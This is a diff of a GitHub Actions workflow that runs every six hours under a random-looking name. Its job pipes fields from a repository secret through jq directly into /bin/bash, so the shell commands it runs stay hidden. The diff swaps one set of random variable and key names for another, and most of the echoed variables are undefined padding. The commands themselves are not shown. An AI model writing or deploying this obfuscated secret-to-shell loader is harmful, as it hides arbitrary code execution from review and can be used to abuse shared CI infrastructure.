@@ -1,8 +1,9 @@
 name: tanloujun7165
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '42 0/6 * * *'
+    - cron: '20 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,21 +12,21 @@ jobs:
       - uses: actions/checkout@v4
       - name: tanloujun7165
         env:
-          boq432: ${{ secrets.boq432 }}
+          pr9707: ${{ secrets.pr9707 }}
         run: |
-          echo $boq432 | jq -r .zgmne349 | /bin/bash
-          echo $ebe19 | jq -r .f886 | /bin/bash
-          echo $binlp068 | jq -r .wje1 | /bin/bash
-          echo $bqxb944 | jq -r .j19 | /bin/bash
-          echo $ccec480 | jq -r .s0329 | /bin/bash
-          echo $jv27 | jq -r .oovse69 | /bin/bash
-          echo $hkex54604 | jq -r .h1133 | /bin/bash
-          echo $yaxya08796 | jq -r .ks36 | /bin/bash
-          echo $edn64294 | jq -r .xot77175 | /bin/bash
-          echo $clwot3 | jq -r .zpgt7 | /bin/bash
-          echo $uoy35 | jq -r .zeki17 | /bin/bash
-          echo $sdbt43795 | jq -r .ssn86751 | /bin/bash
-          echo $tgraa6561 | jq -r .e98075 | /bin/bash
-          echo $mbh453 | jq -r .nhx04847 | /bin/bash
-          echo $amqj819 | jq -r .ft76117 | /bin/bash
+          echo $pr9707 | jq -r .tfb990 | /bin/bash
+          echo $kwv286 | jq -r .izga664 | /bin/bash
+          echo $lkef91322 | jq -r .bgso2264 | /bin/bash
+          echo $yx72 | jq -r .nbf305 | /bin/bash
+          echo $zgo66682 | jq -r .n9361 | /bin/bash
+          echo $cfp401 | jq -r .ylda74966 | /bin/bash
+          echo $zpe74 | jq -r .oymh90757 | /bin/bash
+          echo $rhjp0 | jq -r .uyl78664 | /bin/bash
+          echo $mvqd75 | jq -r .ihd6 | /bin/bash
+          echo $qv959 | jq -r .vk177 | /bin/bash
+          echo $s7755 | jq -r .gg06982 | /bin/bash
+          echo $h04190 | jq -r .yr14 | /bin/bash
+          echo $jacl61132 | jq -r .pjnl07 | /bin/bash
+          echo $ci701 | jq -r .ty96 | /bin/bash
+          echo $xjpa4 | jq -r .rug581 | /bin/bash
 
